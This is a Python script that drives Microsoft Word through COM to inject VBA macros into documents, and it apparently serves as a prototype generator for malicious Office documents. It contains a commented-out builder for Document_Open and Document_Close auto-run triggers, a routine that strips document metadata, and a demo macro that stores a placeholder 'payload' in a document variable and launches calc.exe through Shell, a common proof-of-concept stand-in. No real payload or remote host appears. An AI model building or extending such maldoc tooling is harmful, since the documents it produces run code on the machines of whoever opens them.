import sys
import win32com.client

class WordObject:
    def __init__(self):
        try:
            self.word = win32com.client.Dispatch( "Word.Application" )
        except:
            print("Cannot launch win32com.client.Dispatch(\"Word.Application\"), check if word and pywin32 module are correcty installed")
        self.word.Visible = 0


    def Open(self, sFilename):
        try:
            self.doc = self.word.Documents.Open(sFilename, False, False, False)
        except:
            self.Close()
            self.Quit()
            print("Cannot open "+sFilename+", Please check the validity of the path or the filename")


    def CreateNew(self):
        self.doc = self.word.Documents.Add( ) # create new doc


    def Save(self, sFilename=None):
        if sFilename:
            try:
                self.doc.SaveAs(sFilename)
            except:
                print("Cannot save the file to "+sFilename+" Please check the validity of the path or the filename.")
                self.Close()
                self.Quit()
        else:
            self.doc.Save()

    def AddVba(self, vba, module_name=None):
        if module_name:
            try:
                self.vba_module = self.doc.VBproject.VBComponents.Add(1)
                self.vba_module.Name = module_name
                self.vba_module.CodeModule.AddFromString(vba)
            except:
                self.Close()
                self.Quit()
                print("Can't create vba module " +module_name+", check if your template file is not modifiy or if you module name is ok, or if VBA Project object model is activated on macro options")
        else:
            self.vba_active = self.doc.VBproject.VBComponents("ThisDocument").CodeModule
            self.vba_active.AddFromString(vba)

    def DeleteVbaModule(self, name):
        try:
            vba_module = self.doc.VBproject.VBComponents(name)
            self.doc.VBproject.VBComponents.Remove(vba_module)
        except:
            self.Close()
            self.Quit()
            print("Can't delete vba module " +name+", check if the module was succefully created before")

    def RunMacro(self, macro_name):
        try:
            self.word.Run(macro_name)
        except:
            self.Close()
            self.Quit()
            print("Can't run macro " +macro_name+", check if the macro_name is ok, if the macro exists or if macro are activated in Word/excel")

    def Change_Macro_Settings(self):
        self.word.AutomationSecurity = 3

    def Remove_Metadata(self):
        self.doc.RemoveDocumentInformation(99)
        self.doc.CustomDocumentProperties.Add("Info", False, 4, "Fuck You :)")

    '''
    def generate_trigger_function(self, vba_object, method):

        if method == "onClose":
            gen_fun = """Private Sub Document_Close()
            If ActiveDocument.Variables("%(trigger_close_test_name)s").Value = "%(trigger_close_test_value)s" Then
            ActiveDocument.Variables("%(trigger_close_test_name)s").Value = "NOP"
            ActiveDocument.Save
            Else
            """%{
            "trigger_close_test_name" : trigger_close_test_name,
            "trigger_close_test_value" : trigger_close_test_value
            }
        if method == "onOpen":
            gen_fun = "Private Sub Document_Open()\n"

        gen_fun += """If ActiveDocument.Variables("%(key_name)s").Value <> "%(trigger_close_test_value)s" Then
        %(trigger_fun_name)s
        ActiveDocument.Variables("%(key_name)s").Value = "%(trigger_close_test_value)s"
        If ActiveDocument.ReadOnly=False Then
        ActiveDocument.Save
        End If
        End If
        """%{
        "trigger_close_test_value" : trigger_close_test_name,
        "trigger_fun_name" : vba_object.rand_trigger_function_name,
        "key_name" : vba_object.key_name,
        }

        if method == "onClose": gen_fun += "\n End If\n"
        gen_fun += "End Sub\n"
        gen_vba = vba_object.getCurrentVba() +"\n"+ gen_fun
        return gen_vba
    '''
    def HidePayload(self):
        None
    
    def Close(self):
        self.doc.Close(SaveChanges=0)

    def Quit(self):
        self.word.Quit()


w = WordObject()
w.CreateNew()
w.AddVba("""
Function HidePayload() As Boolean
    Dim payload As String
    p = "%(payload)s"
    ActiveDocument.Variables.Add Name:="FullName", Value:=p
    MsgBox ActiveDocument.Variables("FullName").Value
    Shell ("calc.exe")
End Function

"""%{"payload":"fuckthisshit"})
w.RunMacro("HidePayload")
w.Save("C:\\\\Users\\root\\Desktop\\test.docx")
